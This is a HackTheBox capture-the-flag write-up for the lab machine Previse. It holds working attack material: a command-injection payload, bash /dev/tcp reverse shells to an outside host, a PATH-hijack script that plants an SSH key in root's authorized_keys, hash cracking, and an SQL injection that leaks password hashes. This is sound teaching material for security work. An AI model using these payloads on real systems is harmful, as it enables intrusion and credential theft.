---
title: HTB: Previse
url: https://0xdf.gitlab.io/2022/01/08/htb-previse.html
date: 2022-01-08T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-previse, ctf, hackthebox, nmap, execute-after-redirect, burp, burp-repeater, source-code, php, injection, command-injection, path-hijack, hashcat, sudo, sqli, sqli-insert, youtube, oscp-like-v2
---

![Previse](https://0xdfimages.gitlab.io/img/previse-cover.png)

To get a foothold on Previse, first I’ll exploit an execute after redirect vulnerability in the webpage that allows me access to restricted sites despite not being logged in. From those sites, I’ll create a user for myself and log in normally. Then I get the source to the site, and I’ll find a command injection vulnerability (both using the source and just by enumerating the site) to get a foothold on the box. To escalate, I’ll go into the database and dump the user hashes, one of which cracks to the password for a user on the box. For root, there’s a bash script with a path hijack vulnerability that can run with sudo, allowing for execution. In Beyond Root I’ll look at the standard sudo config and what was changed for Previse, and then look at an unintended SQL injection in an insert statement.

## Box Info

| Name | [Previse](https://hackthebox.com/machines/previse)  [Previse](https://hackthebox.com/machines/previse) [Play on HackTheBox](https://hackthebox.com/machines/previse) |
| --- | --- |
| Release Date | [07 Aug 2021](https://twitter.com/hackthebox_eu/status/1423305554525622273) |
| Retire Date | 08 Jan 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Previse |
| Radar Graph | Radar chart for Previse |
| First Blood User | 00:23:06[onurshin onurshin](https://app.hackthebox.com/users/247178) |
| First Blood Root | 00:26:10[zime zime](https://app.hackthebox.com/users/69035) |
| Creator | [m4lwhere m4lwhere](https://app.hackthebox.com/users/107145) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.104
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 07:49 EDT
Nmap scan report for 10.10.11.104
Host is up (0.064s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 104.76 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.104
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 07:53 EDT
Nmap scan report for 10.10.11.104
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 18.04 Bionic.

### Website - TCP 80

#### Site

The site is a file storage site:

![image-20210716154435463](https://0xdfimages.gitlab.io/img/image-20210716154435463.png)

The footer gives a potential username. Some basic password guessing didn’t work, and I wasn’t able to get any different in error message between bad user and bad password:

![image-20210716154543395](https://0xdfimages.gitlab.io/img/image-20210716154543395.png)

The page extensions show that the site is running PHP, and I did some `feroxbuster`, but I didn’t need it.

#### EAR Vuln

Visiting the root `/` returns a HTTP 302 redirect to `/login.php`. However, there’s also a full page in that response:

```

HTTP/1.1 302 Found
Date: Mon, 16 Aug 2021 11:58:44 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=ee9qjj6lpu5v393dq8lu7hf8hf; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 2801
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta charset="utf-8" />

        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Previse rocks your socks." />
        <meta name="author" content="m4lwhere" />
        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
        <link rel="manifest" href="/site.webmanifest">
        <link rel="stylesheet" href="css/uikit.min.css" />
...[snip]...

```

This is an [execution after redirect (EAR) vulnerability](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)). The PHP code is likely checking for a session, and if there is none, sending the redirect. This is the example from the OWASP page:

```

<?php if (!$loggedin) {
     print "<script>window.location = '/login';</script>\n\n"; 
} ?>

```

This PHP code should have an `exit;` after that print. Otherwise, it sends the code that performs the redirect, but also prints the rest of the page.

#### Skipping Redirects

By default, Burp intercept only stops requests, not responses. To see the root page, I’ll turn on Server Response Interception in Burp Proxy, and then turn Intercept On:

![image-20210716155354456](https://0xdfimages.gitlab.io/img/image-20210716155354456.png)

In Firefox, I’ll try to go to `http://10.10.11.104` again, forwarding the request without changes, and Burp catches the response:

![image-20210716155447412](https://0xdfimages.gitlab.io/img/image-20210716155447412.png)

I’ll change “302 Found” to “200 OK”, and the page comes back:

![image-20210716155536853](https://0xdfimages.gitlab.io/img/image-20210716155536853.png)

This page isn’t too useful, but it’s there. The are links across the top that go to four more pages:
- Accounts (`/accounts.php`)
- Files (`/files.php`)
- Management Menu –> Website Status (`/status.php`)
- Management Menu –> Log Data (`file_logs.php`)

To make this easier, I’ll put a rule in place to make this change always, keeping in mind that if I get a blank page, I should see if it was supposed to be a redirect:

![image-20210716155759939](https://0xdfimages.gitlab.io/img/image-20210716155759939.png)

`status.php` isn’t too interestingm other than that it identifies the back up database is MySQL:

![image-20210716160300754](https://0xdfimages.gitlab.io/img/image-20210716160300754.png)

While I can load both `files.php` and `file_logs.php`, they each contain functionality that return proper 302s, so I can’t access them without logging in. I’ll come back to these.

`accounts.php` has a message that only admins should be here, which is obviously not the case:

![image-20210716160437826](https://0xdfimages.gitlab.io/img/image-20210716160437826.png)

I’ll fill in the form and submit, and it works:

![image-20210716160515826](https://0xdfimages.gitlab.io/img/image-20210716160515826.png)

Now I can turn off the Burp rule and just log in.

#### Files

The files page contains a single file called `SITEBACKUP.ZIP`:

![image-20210716162010407](https://0xdfimages.gitlab.io/img/image-20210716162010407.png)

I was able to view this page using the proxy 302 replace, but not download the zip. Logged in, I can download it. Unsurprisingly, it contains all the source for the site:

```

oxdf@parrot$ ls
accounts.php  config.php  download.php  file_logs.php  files.php  footer.php  header.php  index.php  login.php  logout.php  logs.php  nav.php  status.php

```

#### Log Data

The other page is `file_logs.php`:

![image-20210716163906251](https://0xdfimages.gitlab.io/img/image-20210716163906251.png)

Clicking submit downloads a CSV of file data:

![image-20210716164003680](https://0xdfimages.gitlab.io/img/image-20210716164003680.png)

If I change the delimiter to “space”, I get the same logs but space delimited, as expected:

![image-20210716164452701](https://0xdfimages.gitlab.io/img/image-20210716164452701.png)

## Shell as www-data

### Identify Command Injection

I got access to the source code for the site, but this command injection can also be identified without it. I’ll show how I would approach it both ways.

#### Without Source

The first thing I want to look at it the request when I request logs:

```

POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://10.10.11.104
DNT: 1
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=ee9qjj6lpu5v393dq8lu7hf8hf
Upgrade-Insecure-Requests: 1

delim=comma

```

The other options submit `space` and `tab`. What happens when I submit something not in the list? I’ll send this to Burp Repeater and change it to 0xdf. The response is the same as `comma`:

![image-20210716165042097](https://0xdfimages.gitlab.io/img/image-20210716165042097.png)

I don’t recognize that log format, but the fact that the page is returning it with different delimiters means that likely some text pattern matching and rearranging is going on. While this can be done naturally in PHP, it’s not that easy, compared to Bash. It is possible that the programmer is reading the file and making the manipulations in PHP, but it’s also possible the author is using `system` or `shell_exec` to call something outside PHP.

I’ll try using a `;` to add a command to the parameter:

```

delim=comma;ping -c 1 10.10.14.6 #

```

I’ll open `tcpdump` and then send this with Burp, and ICMP comes back:

```

oxdf@parrot$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:02:14.962560 IP 10.10.11.104 > 10.10.14.6: ICMP echo request, id 2377, seq 1, length 64
17:02:14.962593 IP 10.10.14.6 > 10.10.11.104: ICMP echo reply, id 2377, seq 1, length 64

```

That’s command injection.

#### With Source

With the source code, I’ll start with a `grep` that will identify many of the [dangerous PHP functions](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720):

```

oxdf@parrot$ grep -R -e system -e exec -e passthru -e '`' -e popen -e proc_open *
download.php:        flush(); // Flush system headers
logs.php:$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
logs.php:    flush(); // Flush system headers

```

The first and last ones are comments, but the middle on in `logs.php` is interesting. That file:

```

<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
}
?> 

```

The developer even left a comment about using Python because it was easier.

The output is `echo`ed, but then later it `ob_clean()` to get rid of that so it doesn’t come back in the response.

There is no sanitization of the user input before it’s put into the call to `exec`, which means that I can add all sorts of injections to get execution, like `; [command]` and `$([command])`.

### Shell

To turn this RCE into a shell, I’ll simple add a reverse shell to the request with `nc` listening:

```

delim=comma;bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261' #

```

On sending, it just hangs, but at `nc`:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.104] 53808
bash: cannot set terminal process group (1389): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade my shell using `script` (a nice alternative for `python` PTY module):

```

www-data@previse:/var/www/html$ script /dev/null -c bash
Script started, file is /dev/null
www-data@previse:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@previse:/var/www/html$ 

```

Now I have up arrow for history and tab completion, and Ctrl-C won’t kill the shell.

## Shell as m4lwhere

### Enumeration

#### Homedirs

There’s only one homedir, and it does have `user.txt`:

```

www-data@previse:/home/m4lwhere$ ls -la 
total 52
drwxr-xr-x 5 m4lwhere m4lwhere 4096 Jun 18 01:18 .
drwxr-xr-x 3 root     root     4096 May 25 14:59 ..
lrwxrwxrwx 1 root     root        9 Jun  6 13:04 .bash_history -> /dev/null
-rw-r--r-- 1 m4lwhere m4lwhere  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 m4lwhere m4lwhere 3771 Apr  4  2018 .bashrc
drwx------ 2 m4lwhere m4lwhere 4096 May 25 15:25 .cache
drwxr-x--- 3 m4lwhere m4lwhere 4096 Jun 12 10:09 .config
drwx------ 4 m4lwhere m4lwhere 4096 Jun 12 10:10 .gnupg
-rw-r--r-- 1 m4lwhere m4lwhere  807 Apr  4  2018 .profile
-rw-r--r-- 1 m4lwhere m4lwhere   75 May 31 19:19 .selected_editor
-rw------- 1 m4lwhere m4lwhere 7425 Jun 18 01:18 .viminfo
-rw-r--r-- 1 m4lwhere m4lwhere   75 Jun 18 01:18 .vimrc
-r-------- 1 m4lwhere m4lwhere   33 May 31 19:33 user.txt

```

I can’t read it yet, or anything else of use in here.

#### DB

The status page did mention MySQL. I’ll check out the web directory. There’s a `config.php`:

```

<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>

```

That password doesn’t work for any users on the box.

I’ll connect to the DB with `mysql`:

```

www-data@previse:/var/www/html$ mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 28
Server version: 5.7.34-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

```

There are five databases, but only one that’s really interesting:

```

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

```

It has two tables:

```

mysql> use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

```

`files` looks to hold the actual files, as that’s what a `blob` type is typically used for:

```

mysql> describe files;
+-------------+--------------+------+-----+-------------------+----------------+
| Field       | Type         | Null | Key | Default           | Extra          |
+-------------+--------------+------+-----+-------------------+----------------+
| id          | int(11)      | NO   | PRI | NULL              | auto_increment |
| name        | varchar(255) | NO   |     | NULL              |                |
| size        | int(11)      | NO   |     | NULL              |                |
| user        | varchar(255) | YES  |     | NULL              |                |
| data        | blob         | YES  |     | NULL              |                |
| upload_time | datetime     | YES  |     | CURRENT_TIMESTAMP |                |
| protected   | tinyint(1)   | YES  |     | 0                 |                |
+-------------+--------------+------+-----+-------------------+----------------+
7 rows in set (0.00 sec)

```

I don’t want to do a `select * from files` as it will crash my session because the data is large. The only file is the one I already downloaded:

```

mysql> select name,size,user,protected from files;
+----------------+------+--------+-----------+
| name           | size | user   | protected |
+----------------+------+--------+-----------+
| siteBackup.zip | 9948 | newguy |         1 |
+----------------+------+--------+-----------+
1 row in set (0.00 sec)

```

`accounts` stores a name, password, and create time:

```

mysql> describe accounts;
+------------+--------------+------+-----+-------------------+----------------+
| Field      | Type         | Null | Key | Default           | Extra          |
+------------+--------------+------+-----+-------------------+----------------+
| id         | int(11)      | NO   | PRI | NULL              | auto_increment |
| username   | varchar(50)  | NO   | UNI | NULL              |                |
| password   | varchar(255) | NO   |     | NULL              |                |
| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP |                |
+------------+--------------+------+-----+-------------------+----------------+
4 rows in set (0.00 sec)

```

There is one user that isn’t me:

```

mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | 0xdff    | $1$🧂llol$H.PGkFFp/y7qUAVKR4VKK1 | 2021-07-16 20:04:52 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)

```

The hash seems to be using an emoji character as part of the salt. This is a little silly, but nothing I can’t try to break.

### Crack Hash

I’ll put the hash into a file and feed it to Hashcat. Based on the [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page, it looks like md5-crypt, or mode 500:

```

oxdf@parrot$ hashcat -m 500 m4lwhere.hash /usr/share/wordlists/rockyou.txt
...[snip]...
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
...[snip]...

```

### SSH

That password works over SSH as m4lwhere:

```

oxdf@parrot$ sshpass -p 'ilovecody112235!' ssh m4lwhere@10.10.11.104
...[snip]...
m4lwhere@previse:~$

```

And I can grab `user.txt`:

```

m4lwhere@previse:~$ cat user.txt
1e9de647************************

```

## Shell as root

### Enumeration

m4lwhere can run `sudo` on a script, `access_backup.sh`:

```

m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh

```

There’s an important line missing from that output where `sudo` has been misconfigured to allow the next exploit. I’ll dig into that in [Beyond Root](#sudo-default-configs).

The script is backing up logs to `/var/backups`:

```

#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

```

The comment says they knows they shouldn’t be running this as root, but that they need to fix the permissions later. That’s a directory that is owned by and writable by root, which is why m4lwhere needs `sudo` to run it:

```

m4lwhere@previse:~$ ls -ld /var/backups/
drwxr-xr-x 2 root root 4096 Aug 16 07:42 /var/backups/

```

### Path Injection

The vulnerability in this script is that `gzip` is called without a complete path. In `/dev/shm`, I’ll create a simple script called `gzip`. There are many things I could do, including just calling `bash`, though I had some issues getting that to work. I’ll have it write my public key into root’s `authorized_keys` file and spawn a reverse shell:

```

#!/bin/bash

# enable root ssh
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys

# rev shell
bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

Now I’ll set my path to start with `/dev/shm`:

```

m4lwhere@previse:/dev/shm$ export PATH=/dev/shm:$PATH
m4lwhere@previse:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```

Now when the script goes to call `gzip`, the first one it will find is mine and run it. I’ll start `nc` and run:

```

m4lwhere@previse:/dev/shm$ sudo /opt/scripts/access_backup.sh

```

It hangs, but at `nc`:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.104] 53814
root@previse:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)

```

Also, I’m authorized to connect as root over SSH:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.10.104
...[snip]...
root@previse:~# 

```

Either way, I can grab `root.txt`:

```

root@previse:~# cat root.txt
94b864e9************************

```

## Beyond Root

### sudo Default Configs

When I run `sudo -l` on my hacking VM:

```

oxdf@parrot$ sudo -l
Matching Defaults entries for oxdf on hacky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oxdf may run the following commands on hacky:
    (ALL) NOPASSWD: ALL

```

Or on my desktop:

```

$ sudo -l
[sudo] password for oxdf: 
Matching Defaults entries for oxdf on jawad:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oxdf may run the following commands on jawad:
    (ALL : ALL) ALL

```

These are different from what I see on Previse not only because of what they can run, but also because of the default entries:

```

m4lwhere@previse:/dev/shm$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh

```

`env_reset`, `mail_badpass`, and `secure_path` are all defined by default in the `/etc/sudoers` file. For example, from my VM:

```

#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
oxdf    ALL=(ALL) NOPASSWD: ALL

```

These three options are defined in the [man page for sudoers](http://manpages.ubuntu.com/manpages/trusty/man5/sudoers.5.html):
- `env_reset`: This limits the environment variables that are carried into the new process to a few key ones, and defaults to true.
- `mail_badpass`: tell `sudo` to send an email on failed `sudo` attempts; the man pages say this is off by default, but the default config seems to enable it.
- `secure_path`: This sets the path for commands run with `sudo`, preventing the kind of attack that I used above. This is disabled by default, but it in the default config on all distributions I’m aware of.

As root, I can look at the `/etc/sudoers` file on Previse:

```

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
# Allow manual backups of access logs as needed
m4lwhere ALL=(root) /opt/scripts/access_backup.sh

```

It has removed these defaults.

### Unintended SQL Injection

[George Koniaris](https://gkoniaris.gr/) pointed out this SQL injection in the `INSERT` statement in `files.php`. [This video](https://www.youtube.com/watch?v=s4WdUp3s0dE) walks through how to find and exploit it:

The vulnerable code is:

```

$sql = "INSERT INTO files(name, size, data, user) VALUES('{$fileName}', '{$fileSize}', '{$fileData}', '{$_SESSION['user']}')";
$db = connectDB();
$result = $db->query($sql);

```

Where I can control `filename`. My final payload puts the SQL injection into the `filename` attribute:

```

POST /files.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------81606610532534972821053179055
Content-Length: 335
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/files.php
Cookie: PHPSESSID=mdecrekdk0rlrjcs724posb8oh
Upgrade-Insecure-Requests: 1
-----------------------------81606610532534972821053179055
Content-Disposition: form-data; name="userData"; filename="accounts', '0', '', (SELECT group_concat(concat(username,':',password) SEPARATOR '<br>') from accounts));-- -"
Content-Type: text/plain

test
-----------------------------81606610532534972821053179055--

```

That builds the SQL string to:

```

INSERT INTO files(name, size, data, user) VALUES('accounts', '0', '', (SELECT group_concat(concat(username,':',password) SEPARATOR '<br>') from accounts));-- -', '4', 'test', 'oxdff')

```

This results in the following on the webpage when I refresh, leaking the username and password of each user in the database:

![image-20220112124035475](https://0xdfimages.gitlab.io/img/image-20220112124035475.png)